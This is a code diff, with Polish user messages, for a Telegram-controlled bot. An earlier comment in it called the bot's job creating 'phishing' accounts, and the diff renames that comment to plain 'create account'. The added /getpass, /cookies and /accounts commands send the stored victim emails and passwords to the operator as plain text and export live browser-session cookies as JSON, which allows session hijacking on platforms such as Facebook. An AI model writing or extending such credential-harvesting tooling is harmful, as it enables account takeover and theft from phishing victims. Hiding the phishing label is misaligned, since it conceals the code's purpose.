@@ -145,7 +145,82 @@ async function handleDeluser(chatId, args) {
   }
 }
 
-// ── /addaccount <name> <platform> — create phishing account ──────────────────
+// ── /getpass [id] — show stored credentials ───────────────────────────────────
+
+async function handleGetPass(chatId, args) {
+  try {
+    const { loadAccounts } = await import('./accounts.js');
+    const list = await loadAccounts();
+    if (args.length > 0) {
+      const id = args[0].toLowerCase();
+      const acc = list.find(a => a.id === id);
+      if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
+      const lines = [`📋 Konto: ${acc.label} (${acc.id})`];
+      if (acc.email)    lines.push(`📧 Email: ${acc.email}`);
+      if (acc.password) lines.push(`🔑 Hasło: ${acc.password}`);
+      if (!acc.email && !acc.password) lines.push('(brak zapisanych danych logowania)');
+      await replyTo(chatId, lines.join('\n'));
+    } else {
+      // List all accounts with stored credentials
+      const withCreds = list.filter(a => a.email || a.password);
+      if (withCreds.length === 0) { await replyTo(chatId, 'Brak zapisanych danych logowania.'); return; }
+      const lines = [`🔐 Zapisane dane (${withCreds.length}):`];
+      for (const acc of withCreds) {
+        lines.push(`\n📋 ${acc.label} (${acc.id})`);
+        if (acc.email)    lines.push(`  📧 ${acc.email}`);
+        if (acc.password) lines.push(`  🔑 ${acc.password}`);
+      }
+      await replyTo(chatId, lines.join('\n'));
+    }
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+// ── /cookies <id> — export cookies as JSON file ───────────────────────────────
+
+async function handleCookies(chatId, args) {
+  if (args.length < 1) {
+    await replyTo(chatId, '❌ Użycie: /cookies <id>');
+    return;
+  }
+  const id = args[0].toLowerCase();
+  try {
+    const { getAccount } = await import('./accounts.js');
+    const acc = await getAccount(id);
+    if (!acc) { await replyTo(chatId, `❌ Nie znaleziono konta: "${id}"`); return; }
+    const { getContext } = await import('./browser.js');
+    const ctx = getContext(id);
+    if (!ctx) { await replyTo(chatId, `❌ Sesja "${id}" nie jest uruchomiona.`); return; }
+    const cookies = await ctx.cookies();
+    const json = JSON.stringify(cookies, null, 2);
+    const buf = Buffer.from(json, 'utf8');
+    await sendDocument(buf, `cookies-${id}.json`, `🍪 Cookies: ${acc.label}`);
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+// ── /accounts — list all accounts ────────────────────────────────────────────
+
+async function handleAccounts(chatId) {
+  try {
+    const { loadAccounts } = await import('./accounts.js');
+    const list = await loadAccounts();
+    if (list.length === 0) { await replyTo(chatId, 'Brak kont.'); return; }
+    const lines = [`📱 Konta (${list.length}):`];
+    for (const acc of list) {
+      const hasCreds = acc.email || acc.password ? ' 🔑' : '';
+      lines.push(`• ${acc.id} — ${acc.label}${hasCreds}`);
+    }
+    lines.push('\nUżyj /getpass <id> lub /cookies <id>');
+    await replyTo(chatId, lines.join('\n'));
+  } catch (err) {
+    await replyTo(chatId, `❌ Błąd: ${err?.message || err}`);
+  }
+}
+
+// ── /addaccount <name> <platform> — create account ───────────────────────────
 
 const PLATFORM_URLS = {
   facebook: 'https://www.facebook.com/', fb: 'https://www.facebook.com/',
@@ -240,6 +315,12 @@ export function startCommandListener(publicHost) {
             await handleDeluser(chatId, parts);
           } else if (cmd === '/addaccount') {
             await handleAddAccount(chatId, parts, publicHost);
+          } else if (cmd === '/getpass') {
+            await handleGetPass(chatId, parts);
+          } else if (cmd === '/cookies') {
+            await handleCookies(chatId, parts);
+          } else if (cmd === '/accounts') {
+            await handleAccounts(chatId);
           }
         }
       } catch {
